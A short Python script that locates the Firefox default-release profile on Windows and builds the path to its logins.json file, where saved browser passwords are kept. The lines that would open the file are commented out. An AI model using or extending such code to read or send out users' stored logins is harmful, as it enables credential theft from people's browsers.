import os
a=1

try:
	path = os.path.expanduser('~')+"/AppData/Roaming/Mozilla/Firefox/Profiles"
	#print(path)
	c=os.listdir(path)
	c.sort()
	#print(c)

	for words in c:
		ls=words.endswith('.default-release')
		#print(ls)
		if ls==True:
			d=words
			#print(d)
	path= path+"/"+d
	d=os.listdir(path)
	#print(d)
	path=path+"/"+"logins.json"
	#print(path)
	#path = os.path.realpath(path)
	#os.open(path)
	#return path
	a=2
except:
	#print("no")
	a=2

#os.startfile(path)
#for root, dirs, files in os.walk(path):
  #  for filename in dirs:
  #      print(filename)
#
